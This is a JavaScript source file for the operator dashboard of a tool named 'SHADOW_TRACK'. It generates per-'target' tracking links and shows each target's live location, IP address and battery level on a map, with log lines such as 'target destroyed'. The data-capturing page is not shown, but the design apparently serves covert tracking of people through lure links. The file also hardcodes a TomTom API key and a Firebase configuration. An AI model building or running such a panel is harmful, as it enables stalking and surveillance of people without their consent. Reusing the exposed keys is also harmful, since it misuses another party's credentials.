// --- CONFIG ---
const TOMTOM_KEY = '3xX5NwSGmW2O8MyQ9fwOPqHA8chsMdY1'; 
const firebaseConfig = {
    apiKey: "AIzaSyCDNbgKzJdBKEZUnWH09Az6ZCwUefWJXhY",
    authDomain: "onlinesiparis-2cf91.firebaseapp.com",
    projectId: "onlinesiparis-2cf91",
    databaseURL: "https://onlinesiparis-2cf91-default-rtdb.europe-west1.firebasedatabase.app",
    storageBucket: "onlinesiparis-2cf91.appspot.com",
    messagingSenderId: "366801664755",
    appId: "1:366801664755:web:57b577f1943ebdf1ab8c85"
};

let map, trafficLayer, deviceMarkers = {}; 

// SİSTEM BAŞLATMA
if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const database = firebase.database();

document.addEventListener('DOMContentLoaded', () => {
    initMap();
    setInterval(updateClock, 1000);
    addLog("SHADOW_TRACK v7.0 ÇEVRİMİÇİ.");
});

function initMap() {
    map = L.map('map', { center: [41.0082, 28.9784], zoom: 11, zoomControl: false });
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
    trafficLayer = L.tileLayer(`https://{s}.api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=${TOMTOM_KEY}`, { opacity: 0.8 }).addTo(map);
    map.on('click', onMapClick);
}

// --- LİNK OLUŞTURUCU (TAM İSTEDİĞİN FORMAT) ---
function generateTrackingLink() {
    const randomId = Math.floor(Math.random() * 9000) + 1000; // Örn: 3862
    const nodeId = "NODE_" + randomId;
    
    // Link tam istediğin gibi kök dizine göre:
    const fullURL = `https://berkaytdev.com/track.html?id=${nodeId}`;
    
    document.getElementById('generatedLink').value = fullURL;
    document.getElementById('linkModal').classList.remove('hidden');
    addLog(`YENİ HEDEF KİMLİĞİ: ${nodeId}`);
}

// --- CİHAZ YÖNETİMİ VE SİLME ---
database.ref('locations').on('value', (snapshot) => {
    const data = snapshot.val();
    const list = document.getElementById('deviceList');
    list.innerHTML = ''; 

    if (!data) {
        list.innerHTML = '<div class="text-gray-600 italic text-[10px] text-center">Aktif hedef yok.</div>';
        for (let id in deviceMarkers) { map.removeLayer(deviceMarkers[id]); delete deviceMarkers[id]; }
        return;
    }

    for (let id in data) {
        const info = data[id];
        
        // Marker Güncelle
        if (deviceMarkers[id]) {
            deviceMarkers[id].setLatLng([info.lat, info.lng]);
        } else {
            deviceMarkers[id] = L.marker([info.lat, info.lng], {
                icon: L.divIcon({ className: 'd-icon', html: `<i class="fas fa-crosshairs text-green-500 fa-2x animate-pulse"></i>` })
            }).addTo(map);
        }

        // Listeye Ekle ve Silme Butonu Koy
        const div = document.createElement('div');
        div.className = "glass-panel p-2 mb-2 border-l-2 border-green-500 text-[9px] group";
        div.innerHTML = `
            <div class="flex justify-between items-center">
                <span class="text-green-400 font-bold">${id}</span>
                <button onclick="deleteDevice('${id}')" class="text-red-500 opacity-0 group-hover:opacity-100 transition-all"><i class="fas fa-trash"></i></button>
            </div>
            <div class="text-gray-500 mt-1">IP: ${info.ip || '...'} | PİL: ${info.battery || '--'}</div>
        `;
        list.appendChild(div);
    }
});

function deleteDevice(id) {
    if (confirm(`${id} sistemden silinecek?`)) {
        database.ref('locations/' + id).remove().then(() => {
            if (deviceMarkers[id]) { map.removeLayer(deviceMarkers[id]); delete deviceMarkers[id]; }
            addLog(`HEDEF İMHA EDİLDİ: ${id}`);
        });
    }
}

// DİĞER FONKSİYONLAR (Analiz, Arama vb.)
async function onMapClick(e) {
    const { lat, lng } = e.latlng;
    const res = await fetch(`https://api.tomtom.com/search/2/reverseGeocode/${lat},${lng}.json?key=${TOMTOM_KEY}&language=tr-TR`);
    const data = await res.json();
    L.popup().setLatLng(e.latlng).setContent(`<div class="text-[10px]"><b>KONUM:</b> ${data.addresses[0].address.freeformAddress}</div>`).openOn(map);
}

function updateClock() { document.getElementById('sysTime').innerText = new Date().toLocaleTimeString('tr-TR'); }
function addLog(m) {
    const f = document.getElementById('dataFeed');
    const d = document.createElement('div');
    d.innerHTML = `<span class="text-red-900">[${new Date().toLocaleTimeString()}]</span> ${m}`;
    f.prepend(d);
}

function searchLocation() {
    const q = document.getElementById('searchInput').value;
    fetch(`https://api.tomtom.com/search/2/geocode/${encodeURIComponent(q)}.json?key=${TOMTOM_KEY}&limit=1`)
        .then(r => r.json()).then(d => {
            if (d.results[0]) map.flyTo([d.results[0].position.lat, d.results[0].position.lon], 15);
        });
}

function getMyLocation() {
    navigator.geolocation.getCurrentPosition(p => {
        const coords = [p.coords.latitude, p.coords.longitude];
        map.flyTo(coords, 16);
        L.circleMarker(coords, { radius: 8, color: '#00ffff' }).addTo(map);
    });
}

function toggleLayer(t) {
    if (t === 'traffic') map.hasLayer(trafficLayer) ? map.removeLayer(trafficLayer) : trafficLayer.addTo(map);
    document.getElementById('btn-' + t).classList.toggle('active');
}
